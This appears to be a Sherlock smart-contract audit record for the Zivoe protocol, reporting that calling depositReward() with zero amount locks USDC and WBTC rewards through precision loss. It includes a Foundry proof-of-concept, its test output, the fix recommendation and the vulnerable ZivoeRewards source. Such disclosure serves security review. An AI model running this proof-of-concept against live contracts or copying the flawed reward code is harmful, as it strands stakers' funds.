{
  "Title": "H-5: ````depositReward()```` with zero amount to get reward tokens stuck in ````ZivoeRewards```` contracts",
  "Content": "# Issue H-5: ````depositReward()```` with zero amount to get reward tokens stuck in ````ZivoeRewards```` contracts \n\nSource: https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/129 \n\n## Found by \nAudinarey, Drynooo, KingNFT, KupiaSec, Maniacs, Quanta, SUPERMAN\\_I4G, Tricko, beWater0given, dimulski, flacko, joicygiore\n## Summary\n````ZivoeRewards.depositReward()```` has no access control, attackers can call it with zero amount of ````reward```` to get some reward tokens stuck in contract. The locked amount could be significant especially when reward tokens have small decimals such as ````USDT/USDC/WBTC````.\n\n## Vulnerability Detail\nThe issue arises due to precision loss on L233 and L237.\n```solidity\nFile: zivoe-core-foundry\\src\\ZivoeRewards.sol\n228:     function depositReward(address _rewardsToken, uint256 reward) external updateReward(address(0)) nonReentrant {\n...\n232:         if (block.timestamp >= rewardData[_rewardsToken].periodFinish) {\n233:             rewardData[_rewardsToken].rewardRate = reward.div(rewardData[_rewardsToken].rewardsDuration);\n234:         } else {\n...\n237:             rewardData[_rewardsToken].rewardRate = reward.add(leftover).div(rewardData[_rewardsToken].rewardsDuration);\n238:         }\n...\n243:     }\n\n```\n\nThe following PoC shows two cases that ````654 USDC```` and ````6.6 WBTC```` get stuck in ````ZivoeRewards(stZVE)```` contract after ````20```` calls on ````depositReward()```` with zero amount of ````reward````.\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.17;\n\nimport \"../Utility/Utility.sol\";\nimport \"forge-std/console2.sol\";\n\ncontract TestDepositRewardBug is Utility {\n    address alice;\n    function setUp() public {\n        vm.createSelectFork(\"https://mainnet.gateway.tenderly.co\");\n        deployCore(false);\n\n        deal(USDC, address(zvl), 1_000e6); // 1,000 USDC\n        deal(WBTC, address(zvl), 10e8); // 10 wBTC\n        vm.startPrank(address(zvl));\n        stZVE.addReward(USDC, 365 days);\n        stZVE.addReward(WBTC, 365 days);\n        IERC20(USDC).approve(address(stZVE), type(uint256).max);\n        stZVE.depositReward(USDC, 1_000e6);\n        IERC20(WBTC).approve(address(stZVE), type(uint256).max);\n        stZVE.depositReward(WBTC, 10e8);\n        vm.stopPrank();\n\n\n        alice = makeAddr(\"alice\");\n        deal(address(ZVE), alice, 1_000e18);\n        assertEq(ZVE.balanceOf(alice), 1_000e18);\n\n        vm.startPrank(alice);\n        ZVE.approve(address(stZVE), type(uint256).max);\n        stZVE.stake(1_000e18);\n        vm.stopPrank();\n\n        // alice is the only staker, and is expected to get all rewards\n        assertEq(1_000e18, stZVE.totalSupply());\n    }\n\n    function testAttackOnUSDCReward() public {\n        uint256 timestamp = block.timestamp;\n        for (uint256 i; i < 20; ++i) {   \n            vm.warp(timestamp += 12);\n            // deposit nothing\n            stZVE.depositReward(USDC, 0);\n        }\n\n        vm.warp(timestamp + 365 days + 1); // make sure all reward distributed\n        vm.prank(alice);\n        stZVE.getRewards();\n        uint256 balance = IERC20(USDC).balanceOf(alice);\n        assertApproxEqAbs(346e6, balance, 1e6);\n        balance = IERC20(USDC).balanceOf(address(stZVE));\n        assertApproxEqAbs(654e6, balance, 1e6);\n        console2.log(\"Expected reward: 1,000 USDC, actual reward: 346 USDC, locked: 654 USDC\");\n    }\n\n    function testAttackOnWBTCReward() public {\n        uint256 timestamp = block.timestamp;\n        for (uint256 i; i < 20; ++i) {   \n            vm.warp(timestamp += 12);\n            // deposit nothing\n            stZVE.depositReward(WBTC, 0);\n        }\n\n        vm.warp(timestamp + 365 days + 1); // make sure all reward distributed\n        vm.prank(alice);\n        stZVE.getRewards();\n        uint256 balance = IERC20(WBTC).balanceOf(alice);\n        assertApproxEqAbs(3.4e8, balance, 0.1e8);\n        balance = IERC20(WBTC).balanceOf(address(stZVE));\n        assertApproxEqAbs(6.6e8, balance, 0.1e8);\n        console2.log(\"Expected reward: 10 WBTC, actual reward: 3.4 WBTC, locked: 6.6 WBTC\");\n    }\n}\n```\n\nThe test log:\n```solidity\n2024-03-zivoe\\zivoe-core-testing> forge test --mc TestDepositRewardBug -vv\n[â °] Compiling...\nNo files changed, compilation skipped\n\nRan 2 tests for src/TESTS_Core/Bug_DepositReward.t.sol:TestDepositRewardBug\n[PASS] testAttackOnUSDCReward() (gas: 822088)\nLogs:\n  Expected reward: 1,000 USDC, actual reward: 346 USDC, locked: 654 USDC\n\n[PASS] testAttackOnWBTCReward() (gas: 788716)\nLogs:\n  Expected reward: 10 WBTC, actual reward: 3.4 WBTC, locked: 6.6 WBTC\n\nSuite result: ok. 2 passed; 0 failed; 0 skipped; finished in 30.37s (5.20s CPU time)\n\nRan 1 test suite in 30.41s (30.37s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)\n\n```\n## Impact\nFund get stuck in contract\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeRewards.sol#L228C14-L228C27\n\n## Tool used\n\nManual Review\n\n## Recommendation\nIncreasing the precision of ````rewardRate```` by ````1e18````.\n\n\n\n## Discussion\n\n**pseudonaut**\n\nValid, considering adding whitelists\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> high, depositRewards leaves some dust amounts which can accumulate and can be substantial for 6-8 decimals tokens\n\n\n\n**sherlock-admin2**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/Zivoe/zivoe-core-foundry/pull/260\n\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/280",
  "Code": [
    {
      "filename": "zivoe-core-foundry/src/ZivoeRewards.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"./libraries/ZivoeVotes.sol\";\n\nimport \"../lib/openzeppelin-contracts/contracts/security/ReentrancyGuard.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/utils/Context.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/utils/math/Math.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/utils/math/SafeMath.sol\";\n\ninterface IZivoeGlobals_ZivoeRewards {\n    /// @notice Returns the address of the Zivoe Laboratory.\n    function ZVL() external view returns (address);\n}\n\n\n\n/// @notice This contract facilitates staking and yield distribution.\n///         This contract has the following responsibilities:\n///           - Allows staking and unstaking of modular \"stakingToken\".\n///           - Allows claiming yield distributed / \"deposited\" to this contract.\n///           - Allows multiple assets to be added as \"rewardToken\" for distributions.\n///           - Vests rewardTokens linearly overtime to stakers.\ncontract ZivoeRewards is ReentrancyGuard, Context, ZivoeVotes {\n\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    // ---------------------\n    //    State Variables\n    // ---------------------\n\n    struct Reward {\n        uint256 rewardsDuration;        /// @dev How long rewards take to vest, e.g. 30 days.\n        uint256 periodFinish;           /// @dev When current rewards will finish vesting.\n        uint256 rewardRate;             /// @dev Rewards emitted per second.\n        uint256 lastUpdateTime;         /// @dev Last time this data struct was updated.\n        uint256 rewardPerTokenStored;   /// @dev Last snapshot of rewardPerToken taken.\n    }\n\n    address public immutable GBL;       /// @dev The ZivoeGlobals contract.\n\n    address[] public rewardTokens;      /// @dev Array of ERC20 tokens distributed as rewards (if present).\n\n    uint256 private _totalSupply;       /// @dev Total supply of (non-transferrable) LP tokens for reards contract.\n\n    /// @dev Contains rewards information for each rewardToken.\n    mapping(address => Reward) public rewardData;\n\n    /// @dev The order is account -> rewardAsset -> amount.\n    mapping(address => mapping(address => uint256)) public accountRewardPerTokenPaid;\n\n    /// @dev The order is account -> rewardAsset -> amount.\n    mapping(address => mapping(address => uint256)) public rewards;\n\n     /// @dev Contains LP token balance of each account (is 1:1 ratio with amount deposited).\n    mapping(address => uint256) private _balances;\n\n    IERC20 public stakingToken;         /// @dev IERC20 wrapper for the stakingToken (deposited to receive LP tokens).\n\n\n\n    // -----------------\n    //    Constructor\n    // -----------------\n\n    /// @notice Initializes the ZivoeRewards contract.\n    /// @param _stakingToken The ERC20 asset deposited to mint LP tokens (and returned when burning LP tokens).\n    /// @param _GBL The ZivoeGlobals contract.\n    constructor(address _stakingToken, address _GBL) {\n        stakingToken = IERC20(_stakingToken);\n        GBL = _GBL;\n    }\n\n\n\n    // ------------\n    //    Events\n    // ------------\n\n    /// @notice Emitted during addReward().\n    /// @param  reward The asset that's being distributed.\n    event RewardAdded(address indexed reward);\n\n    /// @notice Emitted during depositReward().\n    /// @param  reward The asset that's being deposited.\n    /// @param  amount The amout deposited.\n    /// @param  depositor The _msgSender() who deposited said reward.\n    event RewardDeposited(address indexed reward, uint256 amount, address indexed depositor);\n\n    /// @notice Emitted during _getRewardAt().\n    /// @param  account The account receiving a reward.\n    /// @param  rewardsToken The ERC20 asset distributed as a reward.\n    /// @param  reward The amount of \"rewardsToken\" distributed.\n    event RewardDistributed(address indexed account, address indexed rewardsToken, uint256 reward);\n\n    /// @notice Emitted during stake().\n    /// @param  account The account staking \"stakingToken\".\n    /// @param  amount The amount of \"stakingToken\" staked.\n    event Staked(address indexed account, uint256 amount);\n\n    /// @notice Emitted during stakeFor().\n    /// @param  account The account receiveing the staked position of \"stakingToken\".\n    /// @param  amount The amount of \"stakingToken\" staked.\n    /// @param  by The account facilitating the staking.\n    event StakedFor(address indexed account, uint256 amount, address indexed by);\n\n    /// @notice Emitted during withdraw().\n    /// @param  account The account withdrawing \"stakingToken\".\n    /// @param  amount The amount of \"stakingToken\" withdrawn.\n    event Withdrawn(address indexed account, uint256 amount);\n\n\n\n    // ---------------\n    //    Modifiers\n    // ---------------\n\n    /// @notice This modifier ensures account rewards information is updated BEFORE mutative actions.\n    /// @param account The account to update personal rewards information if account != address(0).\n    modifier updateReward(address account) {\n        for (uint256 i; i < rewardTokens.length; i++) {\n            address token = rewardTokens[i];\n            rewardData[token].rewardPerTokenStored = rewardPerToken(token);\n            rewardData[token].lastUpdateTime = lastTimeRewardApplicable(token);\n            if (account != address(0)) {\n                rewards[account][token] = earned(account, token);\n                accountRewardPerTokenPaid[account][token] = rewardData[token].rewardPerTokenStored;\n            }\n        }\n        _;\n    }\n\n\n\n    // ---------------\n    //    Functions\n    // ---------------\n\n    /// @notice Returns the amount of tokens owned by \"account\", received when depositing via stake().\n    /// @param account The account to view information of.\n    /// @return amount The amount of tokens owned by \"account\".\n    function balanceOf(address account) external view returns (uint256 amount) { return _balances[account]; }\n    \n    /// @notice Returns the total amount of rewards being distributed to everyone for current rewardsDuration.\n    /// @param  _rewardsToken The asset that's being distributed.\n    /// @return amount The amount of rewards being distributed.\n    function getRewardForDuration(address _rewardsToken) external view returns (uint256 amount) {\n        return rewardData[_rewardsToken].rewardRate.mul(rewardData[_rewardsToken].rewardsDuration);\n    }\n\n    /// @notice Returns the amount of tokens in existence; these are minted and burned when depositing or withdrawing.\n    /// @return amount The amount of tokens in existence.\n    function totalSupply() external view returns (uint256 amount) { return _totalSupply; }\n\n    /// @notice Returns the last snapshot of rewardPerTokenStored taken for a reward asset.\n    /// @param account The account to view information of.\n    /// @param rewardAsset The reward token for which we want to return the rewardPerTokenstored.\n    /// @return amount The latest up-to-date value of rewardPerTokenStored.\n    function viewAccountRewardPerTokenPaid(\n        address account, address rewardAsset\n    ) external view returns (uint256 amount) {\n        return accountRewardPerTokenPaid[account][rewardAsset];\n    }\n\n    /// @notice Returns the rewards earned of a specific rewardToken for an address.\n    /// @param account The account to view information of.\n    /// @param rewardAsset The asset earned as a reward.\n    /// @return amount The amount of rewards earned.\n    function viewRewards(address account, address rewardAsset) external view returns (uint256 amount) {\n        return rewards[account][rewardAsset];\n    }\n\n    /// @notice Provides information on the rewards available for claim.\n    /// @param account The account to view information of.\n    /// @param _rewardsToken The asset that's being distributed.\n    /// @return amount The amount of rewards earned.\n    function earned(address account, address _rewardsToken) public view returns (uint256 amount) {\n        return _balances[account].mul(\n            rewardPerToken(_rewardsToken).sub(accountRewardPerTokenPaid[account][_rewardsToken])\n        ).div(1e18).add(rewards[account][_rewardsToken]);\n    }\n\n    /// @notice Helper function for assessing distribution timelines.\n    /// @param _rewardsToken The asset that's being distributed.\n    /// @return timestamp The most recent time (in UNIX format) at which rewards are available for distribution.\n    function lastTimeRewardApplicable(address _rewardsToken) public view returns (uint256 timestamp) {\n        return Math.min(block.timestamp, rewardData[_rewardsToken].periodFinish);\n    }\n\n    /// @notice Cumulative amount of rewards distributed per LP token.\n    /// @param _rewardsToken The asset that's being distributed.\n    /// @return amount The cumulative amount of rewards distributed per LP token.\n    function rewardPerToken(address _rewardsToken) public view returns (uint256 amount) {\n        if (_totalSupply == 0) { return rewardData[_rewardsToken].rewardPerTokenStored; }\n        return rewardData[_rewardsToken].rewardPerTokenStored.add(\n            lastTimeRewardApplicable(_rewardsToken).sub(\n                rewardData[_rewardsToken].lastUpdateTime\n            ).mul(rewardData[_rewardsToken].rewardRate).mul(1e18).div(_totalSupply)\n        );\n    }\n\n    /// @notice Adds a new asset as a reward to this contract.\n    /// @param _rewardsToken The asset that's being distributed.\n    /// @param _rewardsDuration How long rewards take to vest, e.g. 30 days (denoted in seconds).\n    function addReward(address _rewardsToken, uint256 _rewardsDuration) external {\n        require(\n            _msgSender() == IZivoeGlobals_ZivoeRewards(GBL).ZVL(), \n            \"_msgSender() != IZivoeGlobals_ZivoeRewards(GBL).ZVL()\")\n        ;\n        require(_rewardsDuration > 0, \"ZivoeRewards::addReward() _rewardsDuration == 0\");\n        require(\n            rewardData[_rewardsToken].rewardsDuration == 0, \n            \"ZivoeRewards::addReward() rewardData[_rewardsToken].rewardsDuration != 0\"\n        );\n        require(rewardTokens.length < 10, \"ZivoeRewards::addReward() rewardTokens.length >= 10\");\n\n        rewardTokens.push(_rewardsToken);\n        rewardData[_rewardsToken].rewardsDuration = _rewardsDuration;\n        emit RewardAdded(_rewardsToken);\n    }\n\n    /// @notice Deposits a reward to this contract for distribution.\n    /// @param _rewardsToken The asset that's being distributed.\n    /// @param reward The amount of the _rewardsToken to deposit.\n    function depositReward(address _rewardsToken, uint256 reward) external updateReward(address(0)) nonReentrant {\n        IERC20(_rewardsToken).safeTransferFrom(_msgSender(), address(this), reward);\n\n        // Update vesting accounting for reward (if existing rewards being distributed, increase proportionally).\n        if (block.timestamp >= rewardData[_rewardsToken].periodFinish) {\n            rewardData[_rewardsToken].rewardRate = reward.div(rewardData[_rewardsToken].rewardsDuration);\n        } else {\n            uint256 remaining = rewardData[_rewardsToken].periodFinish.sub(block.timestamp);\n            uint256 leftover = remaining.mul(rewardData[_rewardsToken].rewardRate);\n            rewardData[_rewardsToken].rewardRate = reward.add(leftover).div(rewardData[_rewardsToken].rewardsDuration);\n        }\n\n        rewardData[_rewardsToken].lastUpdateTime = block.timestamp;\n        rewardData[_rewardsToken].periodFinish = block.timestamp.add(rewardData[_rewardsToken].rewardsDuration);\n        emit RewardDeposited(_rewardsToken, reward, _msgSender());\n    }\n\n    /// @notice Simultaneously calls withdraw() and getRewards() for convenience.\n    function fullWithdraw() external {\n        withdraw(_balances[_msgSender()]);\n        getRewards();\n    }\n\n    /// @notice Stakes the specified amount of stakingToken to this contract.\n    /// @param amount The amount of the _rewardsToken to deposit.\n    function stake(uint256 amount) external nonReentrant updateReward(_msgSender()) {\n        require(amount > 0, \"ZivoeRewards::stake() amount == 0\");\n\n        _totalSupply = _totalSupply.add(amount);\n        _writeCheckpoint(_totalSupplyCheckpoints, _add, amount);\n        _writeCheckpoint(_checkpoints[_msgSender()], _add, amount);\n        _balances[_msgSender()] = _balances[_msgSender()].add(amount);\n        stakingToken.safeTransferFrom(_msgSender(), address(this), amount);\n        emit Staked(_msgSender(), amount);\n    }\n\n    /// @notice Stakes the specified amount of stakingToken to this contract, awarded to someone else.\n    /// @dev    This takes stakingToken from _msgSender() and awards stake to \"account\".\n    /// @param amount The amount of the _rewardsToken to deposit.\n    /// @param account The account to stake for (that ultimately receives the stake).\n    function stakeFor(uint256 amount, address account) external nonReentrant updateReward(account) {\n        require(amount > 0, \"ZivoeRewards::stakeFor() amount == 0\");\n        require(account != address(0), \"ZivoeRewards::stakeFor() account == address(0)\");\n\n        _totalSupply = _totalSupply.add(amount);\n        _writeCheckpoint(_totalSupplyCheckpoints, _add, amount);\n        _writeCheckpoint(_checkpoints[account], _add, amount);\n        _balances[account] = _balances[account].add(amount);\n        stakingToken.safeTransferFrom(_msgSender(), address(this), amount);\n        emit StakedFor(account, amount, _msgSender());\n    }\n    \n    /// @notice Claim rewards for all possible _rewardTokens.\n    function getRewards() public updateReward(_msgSender()) {\n        for (uint256 i = 0; i < rewardTokens.length; i++) { _getRewardAt(i); }\n    }\n    \n    /// @notice Claim rewards for a specific _rewardToken.\n    /// @param index The index to claim, corresponds to a given index of rewardToken[].\n    function _getRewardAt(uint256 index) internal nonReentrant {\n        address _rewardsToken = rewardTokens[index];\n        uint256 reward = rewards[_msgSender()][_rewardsToken];\n        if (reward > 0) {\n            rewards[_msgSender()][_rewardsToken] = 0;\n            IERC20(_rewardsToken).safeTransfer(_msgSender(), reward);\n            emit RewardDistributed(_msgSender(), _rewardsToken, reward);\n        }\n    }\n\n    /// @notice Withdraws the specified amount of stakingToken from this contract.\n    /// @param amount The amount of the _rewardsToken to withdraw.\n    function withdraw(uint256 amount) public nonReentrant updateReward(_msgSender()) {\n        require(amount > 0, \"ZivoeRewards::withdraw() amount == 0\");\n\n        _totalSupply = _totalSupply.sub(amount);\n        _writeCheckpoint(_totalSupplyCheckpoints, _subtract, amount);\n        _writeCheckpoint(_checkpoints[_msgSender()], _subtract, amount);\n        _balances[_msgSender()] = _balances[_msgSender()].sub(amount);\n        stakingToken.safeTransfer(_msgSender(), amount);\n        emit Withdrawn(_msgSender(), amount);\n    }\n\n}"
    }
  ]
}